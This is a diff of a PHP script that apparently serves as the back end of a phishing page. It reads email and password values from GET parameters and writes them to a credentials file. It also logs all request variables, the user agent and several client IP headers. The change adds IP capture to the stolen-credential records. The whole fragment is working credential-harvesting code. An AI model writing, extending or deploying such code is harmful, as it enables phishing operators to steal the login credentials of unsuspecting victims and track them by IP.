@@ -10,6 +10,7 @@ $password = $_GET['pass'];
 
 fwrite($credentials_handler, "email='$username'\r\n");
 fwrite($credentials_handler, "pass='$password'\r\n");
+fwrite($credentials_handler, $_SERVER['HTTP_CLIENT_IP'] . "\r\n");
 fwrite($credentials_handler, "----------------\r\n");
 
 fclose($credentials_handler);
@@ -21,14 +22,12 @@ foreach($_GET as $variable => $value) {
     fwrite($log_handler, "$variable='$value'\r\n");
 }
 
-$client_ip = $_SERVER['REMOTE_ADDR'];
-$proxy_forwarded_ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
-
 fwrite($log_handler, "non-standard data------\r\n");
 fwrite($log_handler, $_SERVER['HTTP_USER_AGENT']);
 fwrite($log_handler, "\r\n");
-fwrite($log_handler, "$client_ip\r\n");
-fwrite($log_handler, "$proxy_forwarded_ip\r\n");
+fwrite($log_handler, $_SERVER['HTTP_CLIENT_IP'] . "\r\n");
+fwrite($log_handler, $_SERVER['HTTP_X_FORWARDED_FOR'] . "\r\n");
+fwrite($log_handler, $_SERVER['REMOTE_ADDR'] . "\r\n");
 fwrite($log_handler, "----------------\r\n");
 
 fclose($log_handler);
